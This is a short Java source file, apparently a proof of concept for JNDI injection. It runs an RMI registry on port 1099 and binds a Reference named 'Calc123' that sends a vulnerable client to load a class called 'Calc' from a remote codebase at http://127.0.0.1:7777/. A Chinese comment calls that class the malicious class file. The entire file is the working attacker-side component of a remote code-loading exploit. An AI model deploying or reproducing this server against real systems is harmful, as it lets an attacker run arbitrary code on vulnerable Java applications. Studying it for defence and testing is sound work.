import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        // factory表示加载的类的url和类名，所以恶意类文件必须以全类名命名
        Reference reference = new Reference("Calc1233", "Calc", "http://127.0.0.1:7777/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Calc123", referenceWrapper);
    }
}
